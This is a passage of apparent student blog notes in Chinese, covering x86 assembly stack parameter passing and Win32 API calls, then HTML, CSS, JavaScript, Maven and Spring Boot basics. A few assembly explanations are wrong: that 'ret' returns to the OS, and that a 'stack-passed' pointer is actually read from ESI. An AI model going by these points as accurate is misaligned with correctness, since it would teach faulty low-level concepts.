_start\n```\n\n\n\n3) 函数的参数传递采用堆栈实现，要求函数的形式为void addxy(int ,int,int*)[传址调用]\n\nC语言函数声明\n\n```c\nvoid addxy(int x,int y,int* sum);\n```\n\n汇编实现\n\n压栈顺序: int* sum -> y -> x\n\n堆栈示意图：\n\n![image-20250605141634503](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605141634503.png)\n\n```asm\n.data\n\tx1 dd 5\n\ty1 dd 6\n\tsum dd 0\n.code\naddxy proc\n\tpush ebp\n\tmov ebp,esp\n\n\tmov eax,[ebp+8]\n\tadd eax,[ebp+12]\n\n\tmov [esi],eax ;*sum = x+y\n\n\tpop ebp\n\tret 12\naddxy endp\n\nmain proc\n_start::\n\tpush ebp\n\tmov ebp,esp\n\n\tlea esi,sum\n\n\tpush esi\n\tpush y1\n\tpush x1\n\tcall addxy\n\n\txor eax,eax\n\tpop ebp\n\tret\nmain endp\nend _start\n```\n\n4) 结构体传参\n\n在汇编中定义结构体\n\n```asm\n结构体名 struct\n\tx1 dd ?\n\ty1 dd ?\n\tsum dd ?\n结构体名 ends\n\n.data\n\t变量名 结构体名 <1,2,0> ;{x1=1,y1=2,sum=0}\n```\n\n传参时,应该是传址调用，因此我们需要传入结构体变量的地址\n\n```asm\ndataseg struct\n\tx1 dd ?\n\ty1 dd ?\n\tsum dd ?\ndataseg ends\n\n.data\n\tdata dataseg <5,6,0>\n.code\naddxy proc\n\tpush ebp\n\tmov ebp,esp\n\n\tmov eax,[esi] ;(&data)->x传送到eax\n\tadd eax,[esi+4] ;(&data)->y加到eax\n\n\tmov [esi+8],eax ;eax中的值传送到(&data)->sum\n\n\tpop ebp\n\tret 4 ;平衡堆栈\naddxy endp\n\nmain proc\n_start::\n\tpush ebp\n\tmov ebp,esp\n\n\tlea esi,data ;&data\n\n\tpush esi\n\tcall addxy\n\n\txor eax,eax\n\tpop ebp\n\tret\nmain endp\nend _start\n```\n\n5)改正下面程序的问题\n\n```asm\n;调用程序\n…\nMov bx,10\nMov cx,20\nCall fun\nAdd bx,cx\nAdd ax,bx\n…\n;被调用程序\nFun proc\n    Xor ax,ax\n    Mov cx,5\n    Mov bx,1\n    Shl bx,cx\n    Ret\nFun endp\n```\n\n1.bx,cx寄存器在调用程序段和被调用程序段都被使用，却没有压进堆栈中进行保护，导致子程序段中破坏了它们\n\n2.左移位指令`shl`使用错误，移位次数应该放在cl中而不是cx\n\n3.子程序的结果并没有存到ax中，导致子程序的结果丢失，ax中的值始终是0\n\n## 思考\n\n1.标准C函数参数结合顺序从右至左是什么意思\n\n​\t答:参数压入堆栈的顺序从右至左\n\n2.栈在程序中的作用\n\n​\t答:保护寄存器，存储临时变量，传递参数\n\n3.从机器执行的角度理解标准C中传值和传地址是什么意思\n\n​\t答: 传值:压入堆栈的是原变量的副本，在堆栈中不会影响原变量的值，影响的只是原变量的副本\n\n​\t    传址:压入堆栈的是原变量的地址，在堆栈中可以改变地址指向的值从而影响原变量\n\n4.系统调用是指什么，怎么实现的\n\n​\t答:程序调用操作系统提供的函数，通过引用操作系统提供的动态库(.lib)\n\n5.为什么函数只能返回一个值\n\n​\t答:函数返回值通过eax寄存器，但是eax寄存器只有一个\n\n6.函数调用时如何转到被调用的函数，又是如何返回的\n\n​\t答:`call`指令相当于两条指令:\n\n​\t\t1.将`call`指令的下一条指令地址压入堆栈作为返回地址\n\n​\t\t2.`jmp` 子程序\n\n7.函数的入口地址是什么概念，为什么C语言可以通过指向函数的指针调用函数\n\n​\t答:函数首条指令的地址；函数指针中存放的是函数首条指令的地址，而汇编中调用函数就相当于 `call [函数首地址]`\n\n8.编写子程序时为什么要注意寄存器的保护\n\n​\t答:在子程序中使用寄存器，要先压入堆栈进行保护，使用完毕后再弹出，这是因为，子程序中直接使用寄存器会破坏其中的值，特别是这个寄存器如果在调\t用者中还要再次使用，如果值被破坏，那么程序最后的执行结果就会出错\n\n9.Call指令和RET的指令的作用是什么，RET后面跟的常数是什么意思，为什么要在后面跟常数？\n\n​\t答:\n\n​\t\tcall指令:调用子程序同时将调用程序的下一条指令地址压入堆栈\n\n​\t\tret指令:程序段执行完毕，返回操作系统\n\n​\t\t常数:告诉操作系统平衡堆栈需要几个字节\n\n​\t\t为什么:需要平衡堆栈，避免堆栈不平衡导致栈溢出\n\n# 系统调用\n\n在vs2017中，因为我们创建的项目是C++空项目，所以项目属性中已经帮我们引用了对应的系统调用的库\n\n![image-20250605151434968](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250605151434968.png)\n\n## 声明函数\n\n声明或者调用的时候应当注意参数通常声明为DWORD的数据就可以了，但是要注意，如果在C|C++中声明的是指针，调用的时候需要加上ADDR/offset\n\n以ReadFile为例\n\n```c\nBOOL ReadFile(\n  HANDLE       hFile,          // 文件/设备的句柄\n  LPVOID       lpBuffer,       // 接收数据的缓冲区指针\n  DWORD        nNumberOfBytesToRead, // 要读取的字节数\n  LPDWORD      lpNumberOfBytesRead,  // 实际读取的字节数（输出参数）\n  LPOVERLAPPED lpOverlapped    // 用于异步操作的 OVERLAPPED 结构指针（可选）\n);\n```\n\n在汇编中声明\n\n```asm\nReadFile proto  \n\thFile:dword,\n    lpBuf:dword,\n    notr:dword,\n    lobr:dword,\n    lol:dword\n```\n\n为什么使用proto呢？\n\n使用proto声明就可以忽略函数的修饰名\n\n如果使用extrn\n\n```asm\nEXTRN\t__imp__ReadFile@20:PROC\n```\n\n函数名太繁琐\n\n## 调用函数\n\n### 使用invoke(更方便)\n\n```asm\ninvoke WriteFile,_hout$[ebp],offset msg,msg_len,addr _cWritten$[ebp],00h\n```\n\n\n\n### 使用call\n\n```asm\npush 00h                    ; lpOverlapped (最后一个参数先压栈)\nlea eax, _cWritten$[ebp]    ; lpNumberOfBytesWritten 的地址\npush eax\nmovsx eax,msg_len              ; nNumberOfBytesToWrite（若msg_len是变量，需用 offset）\npush eax\nlea eax, msg                ; lpBuffer\npush eax\npush _hout$[ebp]            ; hFile\ncall WriteFile\n```\n\n使用call更加麻烦，需要自己将参数压入堆栈(但是不用手动平衡堆栈)\n\n## 例题\n\n将下面的C语言代码改写成汇编\n\n```c\n#include \"stdafx.h\"\n#include <windows.h>\nHANDLE hStdout, hStdin;\nint main(void)\n{\n\tLPSTR lpszPrompt1 = \"Type a line and press Enter, or q to quit: \";\n\tCHAR chBuffer[256];\n\tDWORD cRead, cWritten;\n\t// Get handles to STDIN and STDOUT.\n\thStdin = GetStdHandle(STD_INPUT_HANDLE);\n\thStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n\tif (hStdin == INVALID_HANDLE_VALUE ||\n\t\thStdout == INVALID_HANDLE_VALUE)\n\t{\n\t\treturn 1;\n\t}\n\n\t// Write to STDOUT and read from STDIN by using the default\n\t// modes. Input is echoed automatically, and ReadFile\n\t// does not return until a carriage return is typed.\n\t//\n\t// The default input modes are line, processed, and echo.\n\t// The default output modes are processed and wrap at EOL.\n\n\twhile (1)\n\t{\n\t\tif (!WriteFile(\n\t\t\thStdout,               // output handle\n\t\t\tlpszPrompt1,           // prompt string\n\t\t\tlstrlenA(lpszPrompt1), // string length\n\t\t\t&cWritten,             // bytes written\n\t\t\tNULL))                // not overlapped\n\t\t{\n\t\t\t\n\t\t\treturn 1;\n\t\t}\n\n\t\tif (!ReadFile(\n\t\t\thStdin,    // input handle\n\t\t\tchBuffer,  // buffer to read into\n\t\t\t255,       // size of buffer\n\t\t\t&cRead,    // actual bytes read\n\t\t\tNULL))    // not overlapped\n\t\t\tbreak;\n\t\tif (chBuffer[0] == 'q') break;\n\t}\n\treturn 0;\n}\n```\n\n```asm\n.386\n\n.model flat,stdcall\n\noption casemap:none\n\nGetStdHandle proto nStdHandle:dword\n\nReadFile proto  hFile:dword,\n\t\tlpBuf:dword,\n\t\tnotr:dword,\n\t\tlobr:dword,\n\t\tlol:dword\n\nWriteFile proto  hFile:dword,\n\t\tlpBuf:dword,\n\t\tnotr:dword,\n\t\tlobr:dword,\n\t\tlol:dword\n\nSTD_INPUT_HANDLE = -10\nSTD_OUTPUT_HANDLE = -11\nINVALID_HANDLE_VALUE = 0FFFFFFFFH\nBUF_LEN = 255\n\n.data\n\tmsg db \"Type a line and press Enter, or q to quit: \",00dh,00ah ;00dh,00ah 为\\r\\n\n\tmsg_len db $-msg\n\tchBuffer db BUF_LEN dup(0)\n.code\n\nmain proc\n_start::\n\t_hout$ = -16\n\t_hin$ = -12\n\t_cRead$ = -8\n\t_cWritten$ = -4\n\n\tpush ebp\n\tmov ebp,esp\n\n\tsub esp,16 ;给局部变量留空间\n\n\tinvoke GetStdHandle,STD_INPUT_HANDLE\n\tmov _hin$[ebp],eax\n\tinvoke GetStdHandle,STD_OUTPUT_HANDLE\n\tmov _hout$[ebp],eax\t\n\n\tmov ebx,_hin$[ebp]\n\tcmp ebx,INVALID_HANDLE_VALUE\n\tmov ebx,_hout$[ebp]\n\tje InvalidError\n\tcmp ebx,INVALID_HANDLE_VALUE\n\tje InvalidError\ninfloop:\n\tinvoke WriteFile,_hout$[ebp],offset msg,msg_len,addr _cWritten$[ebp],00h\n\tcmp eax,0\n\tje InvalidError\n\n\tinvoke ReadFile,_hin$[ebp],offset chBuffer,255,addr _cRead$[ebp],00h\n\tcmp eax,0\n\tje NormalEnd\n\n\tlea edi,chBuffer\n\tmov al,[edi]\n\tcmp al,071h\n\tje NormalEnd\n\n\tjmp infloop\n\nNormalEnd:\n\tadd esp,16\n\txor eax,eax\n\tpop ebp\n\tret\n\nInvalidError:\n\tadd esp,16\n\tmov eax,1\n\tpop ebp\n\tret\nmain endp\nend _start\n```\n\n## 思考:\n\n系统调用/API是什么，程序员为什么通常要了解特定系统的系统调用/API？\n\n​\t系统调用:是内核提供的底层接口，通过软中断（如 `int 0x80`）或专用指令（如 `syscall`）触发\n\n​\tAPI：应用程序接口，是高级语言对系统调用的封装，可能涉及多个系统调用。\n\n​\t不同的操作系统有不同的系统调用，不了解他们会使自己写的程序不具有跨平台移植性\n\n​\t同时，系统调用是别人造好的轮子；用别人造好的轮子，写程序更加方便高效\n\n什么是HANDLE？有什么用？\n\n句柄，用来标识对象的标识符，用来描述窗口，文件等\n\n句柄隐藏了资源的具体实现细节，应用程序只需通过句柄与资源进行交互，而无需关心资源的存储位置和内部结构，这使得资源管理更加简单和高效\n\n# 模块化编程\n\nComming soon...","tags":["汇编"],"categories":["汇编"]},{"title":"Java-web","url":"/2025/05/24/javaweb/","content":"\n# HTML\n\n## 参考\n\nhttps://www.w3cschool.cn/html/html-form.html\n\n## 基本语法\n\n![image-20241105214019480](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241105214019480.png)\n\n### 基本结构\n\n![image-20241105214231412](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241105214231412.png)\n\n不允许交叉嵌套\n\n```html\n正确：\n<div>\n    <a></a>\n</div>\n错误：\n<div>\n    <a>\n</div>\n    </a>\n```\n\n![image-20241105214602794](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241105214602794-1745151037783.png)\n\n```html\n<DOCTYPE html>\n<!--这个头部是为了告诉浏览器解析HTML的标准\nHTML分为HTML,xhtml,HTML5等不同版本\n>    \n```\n\n```html\n<DOCTYPE html>\n    <html lang=\"en\">\n\n    <head>\n        <meta charset=\"utf-8\">\n        <title>\n            test\n        </title>\n    </head>\n\n    <body>\n\n    </body>\n\n    </html>\n```\n\nvscode中输入！+tab可以自动补全\n\n简单页面小代码\n\n```html\n<!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>测试</title>\n    </head>\n    <body>\n        <h1>欢迎来到测试页面</h1>\n        <a href=\"https://space.bilibili.com/375081822/favlist?fid=3135803622&ftype=create \">好康的</a>\n    </body>\n</html>\n```\n\n效果![image-20241105220636597](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241105220636597.png)\n\n![image-20241105220543803](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241105220543803.png)\n\n### 头部信息\n\n![image-20241105220737041](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241105220737041.png)\n\n### 常用标签\n\n![image-20241106150120812](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241106150120812.png)\n\n```html\n<b></b>\n<strong></strong>\n<!--区别在于strong标签可以优先被搜索引擎找到-->\n```\n\n![image-20241106150914285](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241106150914285.png)\n\n列表中也可以放链接\n\n```html\n    <ul>\n        <li><a href=\"https://space.bilibili.com/375081822/favlist?fid=3135803622&ftype=create\">好康的</a></li>\n        <li><a href=\"https://www.baidu.com\">好用的</a></li>\n        <li>ccc</li>\n    </ul>\n```\n\n<img src=\"C:\\Users\\27251\\AppData\\Roaming\\Typora\\typora-user-images\\image-20241106152130453.png\" alt=\"image-20241106152130453\" style=\"zoom:100%;\" />\n\n![image-20241106152446484](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241106152446484.png)\n\n锚点就像goto和标签,#作用是定位,比如./h1.html#chiikawa1意思就是跳转到h1.html下的chiikawa1锚点\n\n![image-20241106153736437](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241106153736437.png)\n\n合并单元格：由左向右,由上到下\n\n![image-20241106154356090](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241106154356090.png)\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <form action=\"./h1.html\" method=\"GET\"><!--用get方法将参数传到./h1.html-->\n        <input type=\"text\" name=\"uname\"><br/><br/><!--type表示表单类型,文本框,密码框,提交按钮-->\n        <input type=\"password\" name=\"upass\"><br/><br/>\n        <input type=\"submit\" value=\"登录\">\n    </form>\n</body>\n</html>\n```\n\n![image-20241106160459005](C:/Users/27251/Desktop/笔记/javaweb/image-20241106160459005.png)\n\n![image-20241106160622879](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241106160622879.png)\n\n# CSS\n\n![image-20241112204644589](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241112204644589.png)\n\n## 语法\n\n![image-20241112210952820](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241112210952820.png)\n\n选择器：选的是<body>中的标签名</body>\n\n```html\n<!--css样式位于style标签中-->\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"GBK\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <style>\n        strong{font-size: 20;color: aquamarine;}\n    </style>\n</head>\n<body>\n    <strong>这是CSS测试页面</strong>\n    <ul>\n        <li>\n            <a href=\"https://www.bilibili.com\">学习网站</a>\n        </li>\n        <li>CSS测试</li>\n        <li>油专</li>\n    </ul>\n</body>\n</html>\n```\n\n## 使用方法\n\n![image-20241112211552861](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241112211552861.png)\n\n1.外部样式表：\n\n![image-20241112214706096](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241112214706096.png)\n\nhtml中用link单标签引用\n\n```css\n/*mycss.css*/\nh1{font-size: 30;background-color: aquamarine;color: crimson;}\n```\n\n2.内嵌方法\n\n嵌入在style中\n\n3.内联样式\n\n```html\n<!-- 直接将style写入标签中-->\n<ul>\n    <li style=\"font-size:25;color:red\"></li>\n</ul>\n```\n\n## CSS2常用选择器\n\n![image-20241113143203446](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241113143203446.png)\n\n### html选择器\n\n把html的标签作为选择器,比如h1,a,也可以用*表示对所有标签生效（可能有兼容性问题）\n\n缺点：过于笼统,html中有很多标签是重复的\n\n### 类选择器\n\n在标签中加入class属性,在创建css样式时用  （标签名）.属性值进行标记\n\n属性名可写可不写,不写属性名,那么只要class属性值等于css样式前的类属性值,css就会对该标签生效\n\n![image-20241113145110647](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241113145110647.png)\n\n### id选择器\n\n根据标签中的id属性的属性值进行选择\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"GBK\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <style>\n        #hid{font-size: 20;color: aquamarine;}/*#开始*/\n    </style>\n    \n</head>\n<body>\n    <strong>这是CSS测试页面</strong>\n    <ul>\n        <li id=\"hid\">\n            <a href=\"https://www.bilibili.com\">学习网站</a>\n        </li>\n        <li>CSS测试</li>\n        <li>油专</li>\n    </ul>\n</body>\n</html>\n```\n\n![image-20241113151502621](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241113151502621.png)\n\n### 关联选择器/包含选择器\n\n![image-20241113151832026](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241113151832026.png)\n\n### 组合选择器\n\n![image-20241113151857100](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241113151857100.png)\n\n### 伪类选择器![image-20241113152003635](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241113152003635.png)\n\n## 常用属性\n\n![image-20241116141614334](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241116141614334.png)\n\n### 尺寸与单位\n\n![image-20241116141922772](C:/Users/27251/Desktop/笔记/javaweb/image-20241116141922772.png)\n\n### 颜色\n\n![image-20241116142012471](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241116142012471.png)\n\n![image-20241116142144234](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241116142144234.png)\n\n### 字体属性font\n\n![image-20241116142434890](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241116142434890.png)\n\n![image-20241116143211419](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241116143211419.png)\n\n### 文本属性\n\n![image-20241116143406170](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241116143406170.png)\n\n![image-20241116143422896](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241116143422896.png)\n\n# JavaScript\n\n![image-20241119164618385](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119164618385.png)\n\n## 引入方式\n\n![image-20241119165144002](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119165144002.png)\n\n## 书写语法\n\n![image-20241119165641575](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119165641575.png)\n\n![image-20241119165911317](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119165911317.png)\n\n## 变量\n\n![image-20241119170445990](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119170445990.png)\n\n![image-20241119170644091](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119170644091.png)\n\n![image-20241119170730015](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119170730015.png)\n\n## 数据类型&运算符\n\n![image-20241119170948064](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119170948064.png)\n\n![image-20241119171037540](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119171037540.png)\n\n![image-20241119171256783](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119171256783.png)\n\n![image-20241119171419300](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119171419300.png)\n\n![image-20241119171550102](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119171550102.png)\n\n![image-20241119171612159](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119171612159.png)\n\n<u>***parseInt()会从第一个字符开始匹配,直到遇到第一个非数字停止转换；所以如果转换的内容第一个字符就不是数字,转换结果就是NaN***</u>\n\n![image-20241119172004670](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119172004670.png)\n\n## Day02-06. JS-函数\n\n![image-20241119172350774](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119172350774.png)\n\n![image-20241119172541604](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119172541604.png)\n\njs函数可以接收任意个数参数,有几个形参就接收前几个参数\n\n## Day02-07. JS-对象-Array数组\n\n![image-20241119172827435](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119172827435.png)\n\n![image-20241119173017067](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119173017067.png)\n\n![image-20241119173224884](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119173224884.png)\n\n```js\nvar arr = [1,2,3,4];\narr[10] = \"佐佐木淳平\";\narr.forEach(function(e){//相当于匿名内部类\n    console.log(e);\n})\n//箭头函数简化（lambda表达式）\nvar arr = [1,2,3,4];\narr[10] = \"佐佐木淳平\";\narr.forEach((e)=>{\n    console.log(e);\n})\n\n//splice()参数1：起始索引 参数2：删除个数\n```\n\n## Day02-08. JS-对象-String字符串\n\n![image-20241119174136829](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119174136829.png)\n\n![image-20241119174205541](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119174205541.png)\n\nsubstring参数1：开始索引,参数2：结束索引；左闭右开\n\n## Day02-09. JS-对象-JSON\n\n![image-20241119174436326](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119174436326.png)\n\n函数简化写法：\n\n```\n函数名(){\n\n}\n```\n\n![image-20241119174651818](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119174651818.png)\n\n![image-20241119174803855](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119174803855.png)\n\n***key-value形式***\n\n***key必须用双引号包围***\n\n![image-20241119175056791](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119175056791.png)\n\n![image-20241119175150122](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119175150122.png)\n\n```js\nvar json_str = '{\"name\":\"wwwtty\",\"password\":114514}';\nvar json_obj = JSON.parse(json_str);\nvar json_str = JSON.stringify(json_obj);\nalert(json_obj.name);\nalert(json_str);\n```\n\n\n\n## Day02-10. JS-对象-BOM\n\n![image-20241119185453379](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119185453379.png)\n\n![image-20241119193346757](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119193346757.png)\n\n```js\nvar res = window.confirm();//确认为true,取消为false\nif(res){\n    alert(\"确定\");\n}else{\n    alert(\"取消\");\n}\n```\n\n![image-20241119194157829](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119194157829.png)\n\n```js\nalert(location.href);\nlocation.href=\"https://www.bilibili.com\";//跳转到该网址\n```\n\n## Day02-11. JS-对象-DOM\n\n![image-20241119195159129](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119195159129.png)\n\n## Day02-12. JS-对象-DOM案例\n\n![image-20241119195435377](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119195435377.png)\n\n![image-20241119195552066](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119195552066.png)\n\n可以用.innerHTML=修改div标签内文本内容\n\n## Day02-13. JS-事件-事件绑定&常见事件\n\n![image-20241119201210647](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119201210647.png)\n\n![image-20241119201342163](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119201342163.png)\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>测试</title>\n</head>\n<body>\n    <form action=\"\" method=\"get\">\n        <input type=\"button\" value=\"点我\" id=\"hhh\">\n    </form>\n    <script>\n        function on(){\n            alert(\"点我干嘛?\");\n        }\n        document.getElementById(\"hhh\").onclick=function(){\n            alert(\"干嘛点我\");\n        }\n\n\n    </script>\n</body>\n</html>\n```\n\n![image-20241119202455816](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119202455816.png)\n\n焦点：比如光标在输入框中闪烁\n\n## Day02-14. JS-事件-案例\n\n\n\n# Vue\n\n## Day02-15. Vue-概述\n\n![image-20241119203955051](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119203955051.png)\n\n![image-20241119204210374](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241119204210374.png)\n\n## Day02-16. Vue-指令-v-bind&v-model&v-on\n\n## Day02-17. Vue-指令-v-if&v-show&v-for\n\n## Day02-18. Vue-指令-案例\n\n## Day02-19. Vue-生命周期\n\n\n\n# Ajax\n\n# nginx打包部署\n\n```bash\n#vue项目目录下\nnpm run build\n```\n\n打包好后会有一个dist文件夹\n\n部署：将dist复制到nginx的/html中,启动nginx.exe 占用80端口（默认）\n\n![image-20250416204044806](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416204044806.png)\n\n![image-20250416204440011](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416204440011.png)\n\n若端口被占用,在nginx.conf里更改\n\n# Maven\n\n![image-20241120164940486](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241120164940486.png)\n\n![image-20241120165923695](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241120165923695.png)\n\n![image-20241120173152507](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241120173152507.png)\n\n![image-20241120174537451](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241120174537451.png)\n\n![image-20241124202223071](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124202223071.png)\n\n![image-20241124202556434](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124202556434.png)\n\n## 依赖配置\n\n![image-20241124202749916](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124202749916.png)\n\n```xml\n        <dependencies>\n                <dependency>\n                        <groupId>ch.qos.logback</groupId>\n                        <artifactId>logback-classic</artifactId> <!--先写这个,其他idea可以代码提示-->\n                        <version>1.5.6</version>\n                </dependency>\n        </dependencies>\n```\n\n![image-20241124203647719](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124203647719.png)\n\n## 依赖传递\n\n![image-20241124203856449](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124203856449.png)\n\n### 排除依赖![image-20241124204124508](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124204124508.png)\n\n## 依赖范围\n\n![image-20241124205452618](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124205452618.png)\n\n## 生命周期\n\n![image-20241124211735777](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124211735777.png)\n\n![image-20241124211752639](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124211752639.png)\n\n![image-20241124211957736](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124211957736.png)\n\n![image-20241124212032323](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124212032323.png)\n\n# SpringBoot\n\n![image-20250417203457434](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250417203457434.png)\n\n![image-20241124214239548](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124214239548.png)\n\n\n\n\n\n![image-20241124214652524](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241124214652524.png)\n\n![image-20250416205936107](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416205936107.png)\n\n<img src=\"C:\\Users\\27251\\AppData\\Roaming\\Typora\\typora-user-images\\image-20250416210249296.png\" alt=\"image-20250416210249296\" style=\"zoom: 67%;\" />\n\n![image-20250416210302032](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20250416210302032.png)\n\n### @RestController\n\n@RestController 通常用于创建 REST API,其中每个方法的返回值都是 HTTP 响应体的一部分。这使得开发人员可以专注于业务逻辑,而不必担心视图解析和模型数据的填充。\n\n### @RequestMapping()注解\n\n```\n在 Java 的 Spring 框架中,@RequestMapping注解用于将 HTTP 请求映射到控制器的处理方法上。这个注解可以用于类或方法上,用于定义请求的 URL 模式、HTTP 方法（如 GET、POST）、请求参数、头部信息等。\n```\n\n```java\npackage com.example.demo.controller;\n\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RestController;\n\n//请求处理类\n@RestController\npublic class HelloController {\n\n        //请求路径\n        @RequestMapping(\"/Hello\")\n        public String Hello(){\n                return \"Hello SpringBoot\";\n        }\n}\n\n```\n\n# HTTP协议\n\n![image-20241125164413610](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125164413610.png)\n\n![image-20241125165152198](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125165152198.png)\n\n## 请求数据格式\n\n请求行,请求头,请求体\n\n![image-20241125165931263](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125165931263.png)\n\n请求头与请求体之间用空行隔开\n\n![image-20241125170028877](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125170028877.png)\n\n### 常见请求头：\n\n![image-20241125165719305](https://raw.githubusercontent.com/blkheadfish/picGo/main/imgs/image-20241125165719305.png)\n\nUser-Agent用于浏览器兼容性处理\n\n\n\n## 